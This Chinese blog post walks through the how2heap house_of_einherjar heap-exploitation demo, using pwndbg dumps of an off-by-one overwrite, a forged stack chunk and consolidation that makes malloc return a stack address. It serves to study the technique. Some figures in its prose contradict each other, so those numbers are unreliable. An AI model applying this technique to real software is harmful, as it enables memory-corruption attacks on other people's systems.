<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x555555757290</span><br><span class="hljs-number">0x555555757290</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000501</span><br><span class="hljs-number">0x5555557572a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572c0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure>
<p>执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure>
<p>这里其实就是将chunk_b的malloc指针-0x8的位置，即chunk_b的size值放在了b_size_ptr变量中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p b_size_ptr<br>$<span class="hljs-number">1</span> = (<span class="hljs-type">uint64_t</span> *) <span class="hljs-number">0x555555757298</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx <span class="hljs-number">0x555555757298</span><br><span class="hljs-number">0x555555757298</span>:	<span class="hljs-number">0x0000000000000501</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure>
<p>再执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">a[real_a_size] = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
<p>这里模拟的就是off-by-one的过程。那么这样一来chunk_b的inuse标志位就被覆盖成了0</p>
<p>看一下两个chunk<br>注意chunkb的变化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0x555555757250</span><br><span class="hljs-number">0x555555757250</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000041</span><br><span class="hljs-number">0x555555757260</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757270</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757280</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757290</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000500</span>**<br><span class="hljs-number">0x5555557572a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572c0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><br></code></pre></td></tr></table></figure>
<p>执行到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p/x fake_size<br>$<span class="hljs-number">2</span> = <span class="hljs-number">0xffffd55555758fd0</span><br></code></pre></td></tr></table></figure>

<p>fake_size是由b-sizeof(size_t)<em>2和(uint8_t</em>)fake_chunk相减得到的：</p>
<p>b-sizeof(size_t)<em>2：chunk_b的malloc指针减去两个地址位宽，也就是chunk_b的头指针<br>(uint8_t</em>)fake_chunk：即是伪造堆块的头指针<br>那么这样一来就可以很明显的看出fake_size，即是chunk_b头指针距离fake_chunk头指针的偏移，需要注意的是我们看到的偏移为0xffffd55555758fd0<br>这代表着偏移其实是一个负数</p>
<p>执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br></code></pre></td></tr></table></figure>

<p>看chunkb和fakechunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x555555757290</span> <span class="hljs-comment">//chunkb</span><br><span class="hljs-number">0x555555757290</span>:	<span class="hljs-number">0xffffd55555758fd0</span>	<span class="hljs-number">0x0000000000000500</span><br><span class="hljs-number">0x5555557572a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572c0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5555557572d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffffffe2c0</span> <span class="hljs-comment">//fakechunk</span><br><span class="hljs-number">0x7fffffffe2c0</span>:	<span class="hljs-number">0x0000000000000100</span>	<span class="hljs-number">0xffffd55555758fd0</span><br><span class="hljs-number">0x7fffffffe2d0</span>:	<span class="hljs-number">0x00007fffffffe2c0</span>	<span class="hljs-number">0x00007fffffffe2c0</span><br><span class="hljs-number">0x7fffffffe2e0</span>:	<span class="hljs-number">0x00007fffffffe2c0</span>	<span class="hljs-number">0x00007fffffffe2c0</span><br><span class="hljs-number">0x7fffffffe2f0</span>:	<span class="hljs-number">0x00007fffffffe3e0</span>	<span class="hljs-number">0x574290d927ca7a00</span><br><span class="hljs-number">0x7fffffffe300</span>:	<span class="hljs-number">0x0000555555554ae0</span>	<span class="hljs-number">0x00007ffff7a03c87</span><br><br></code></pre></td></tr></table></figure>
<p>chunk_b的prev_size等于fake_chunk的size，这个size恰巧又是chunk_b到fake_chunk的偏移，更巧的是chunk_b的inuse标志位为0</p>
<p>那么如果我们free(b)，os首先会去检查其inuse标志位，发现为0，这就意味着存在一个相邻地址的堆块也是处于释放状态的<br>那么就会根据chunk_b的prev_size先前找是否存在一个大小为0xffffd55555779d41大小的堆块<br>结果根据chunk_b的头指针+0xffffd55555779d41处找到了fake_chunk<br>fake_chunk的size正是我们设置的0xffffd55555779d41<br>根据free函数后向合并机制，由于我们伪造了fake_chunk的fd、bk、fd_nextsize、bk_nextsize，所以可以绕过unlink检查<br>那么chunkb与fakechunk就被合并称为一个大小为fake_size + b_size的大堆块<br>并且合并大堆块的头指针即是fake_chunk的头指针0x7fffffffe2d0</p>
<p>且，根据top_chunk合并机制，由于chunk_b是紧邻top_chunk的，那么在chunk_b与fake_chunk合并之后top_chunk会收下合并后的整个大堆块<br>新的top_chunk的size变成了old_topchunk_size + fake_chunk_size + chunkb_size。并且top_chunk的头指针会变成合并堆块的头指针，即fake_chunk的头指针0xffffd55555779d41</p>
<p>接下来我们执行free(b)和malloc(0x200)这两步操作<br>free(b)会完成上述的执行过程<br>而因为bin中没有能够满足malloc(0x200)的空闲块，所以会向top_chunk申请一个size为0x200大小的堆块<br>由于此时top_chunk的头指针是fake_chunk(0x7fffffffe2d0)<br>所以最后被启用的堆块即是以fake_chunk为头指针0x7fffffffe2d0，size为0x210大小的堆块</p>
<p>这样我们伪造的fakechunk就会被以正常堆块的形式被malloc出来了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; c<br>Continuing.<br>Our fake chunk size is now <span class="hljs-number">0xffffd55555779d41</span> (b.size + fake_prev_size)<br>Next <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x200</span>)</span> is at 0x7fffffffe2d0<br>[Inferior 1 <span class="hljs-params">(process <span class="hljs-number">4452</span>)</span> exited normally]<br></code></pre></td></tr></table></figure>

<p><em>像小时候玩的祖玛</em></p>
<p>放个完整的运行信息<br>程序为how2heap源程序house_of_einherjar</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">root@ubuntu:/home/str1k3/Desktop# ./a.out<br>Welcome to House of Einherjar!<br>Tested in Ubuntu <span class="hljs-number">18.04</span><span class="hljs-number">.4</span> <span class="hljs-number">64b</span>it.<br>This technique only works with disabled tcache-option <span class="hljs-keyword">for</span> glibc or with size of b larger than <span class="hljs-number">0x408</span>, see build_glibc.sh <span class="hljs-keyword">for</span> build instructions.<br>This technique can be used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br><br>We allocate <span class="hljs-number">0x38</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span><br>a: <span class="hljs-number">0x5625ee49e260</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> after rounding: <span class="hljs-number">0x38</span><br><br>We create a fake chunk wherever we want, in this <span class="hljs-keyword">case</span> we<span class="hljs-number">&#x27;ll</span> create the chunk on the <span class="hljs-built_in">stack</span><br>However, you can also create the chunk in the heap or the bss, as <span class="hljs-type">long</span> as you know its address<br>We <span class="hljs-built_in">set</span> our fwd and bck pointers to point at the fake_chunk in order to pass the unlink <span class="hljs-title function_">checks</span><br><span class="hljs-params">(although we could <span class="hljs-keyword">do</span> the unsafe unlink technique here in some scenarios)</span><br>Our fake chunk at 0x7ffe1bda3090 looks like:<br><span class="hljs-title function_">prev_size</span> <span class="hljs-params">(not used)</span>: 0x100<br>size: 0x100<br>fwd: 0x7ffe1bda3090<br>bck: 0x7ffe1bda3090<br>fwd_nextsize: 0x7ffe1bda3090<br>bck_nextsize: 0x7ffe1bda3090<br><br>We allocate 0x4f8 bytes <span class="hljs-keyword">for</span> &#x27;b&#x27;.<br>b: 0x5625ee49e2a0<br><br>b.size: 0x501<br>b.size is: <span class="hljs-params">(<span class="hljs-number">0x500</span>)</span> | prev_inuse = <span class="hljs-number">0x501</span><br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x500</span><br>This is easiest <span class="hljs-keyword">if</span> b.size is a multiple of <span class="hljs-number">0x100</span> so you don<span class="hljs-number">&#x27;</span>t change the size of b, only its prev_inuse bit<br>If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk<br><br>We write a fake prev_size to the last <span class="hljs-number">8</span> bytes of a so that it will consolidate with our fake chunk<br>Our fake prev_size will be <span class="hljs-number">0x5625ee49e290</span> - <span class="hljs-number">0x7ffe1bda3090</span> = <span class="hljs-number">0xffffd627d26fb200</span><br><br>Modify fake chunk<span class="hljs-number">&#x27;</span>s size to reflect b<span class="hljs-number">&#x27;</span>s new prev_size<br>Now we <span class="hljs-built_in">free</span> b and this will consolidate with our fake chunk since b prev_inuse is not <span class="hljs-built_in">set</span><br>Our fake chunk size is now <span class="hljs-number">0xffffd627d271bf71</span> (b.size + fake_prev_size)<br><br>Now we can call <span class="hljs-built_in">malloc</span>() and it will begin in our fake chunk<br>Next <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>) is at <span class="hljs-number">0x7ffe1bda30a0</span><br><br></code></pre></td></tr></table></figure>
<p><em>来自hollk师傅的总结</em><br>利用该方法需要注意的三点</p>
<p>1.需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分<br>2.需要计算目的 fake_chunk 与 chunk_b 地址之间的差，所以需要泄漏地址<br>3.需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测</p>
<p><em><strong>前面的例题，以后再来探索吧</strong></em></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/13/house-of-storm/">← 下一篇 house_of_storm</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/01/house-of-orange/">house_of_orange 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>